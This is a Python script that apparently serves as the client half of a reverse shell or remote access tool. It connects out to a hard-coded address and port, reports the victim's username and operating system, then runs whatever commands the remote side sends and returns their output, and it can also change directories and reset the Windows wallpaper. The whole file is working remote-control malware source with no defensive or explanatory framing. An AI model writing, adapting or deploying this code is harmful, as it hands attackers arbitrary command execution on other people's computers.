from getpass import getuser
from socket import *
import subprocess
import platform
import ctypes
import os

get_os = platform.uname()[0]
get_user = getuser()
os_info = "client_name : "+str(get_user)+" <-> "+"client_os : "+str(get_os)

ip = "127.0.0.1"
port = 1234

connection = socket(AF_INET, SOCK_STREAM)
connection.connect((ip, port))

connection.send(os_info.encode())

while True:
    recever = connection.recv(1024).decode()

    if recever == "exit":
        exit()
    elif recever[:2] == "cd":
        os.chdir(recever[3:])
        connection.send(os.getcwd().encode())
    elif recever == "chbackg":
        ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:/User/Noutbukcom/OneDrive/Ishchi stol/New folder/wall4.jpg", 0)

    else:
        out_put = subprocess.getoutput(recever)
        if out_put == "" or out_put == None:
            out_put = "error"
            connection.send(out_put.encode())
        else:
            connection.send(out_put.encode())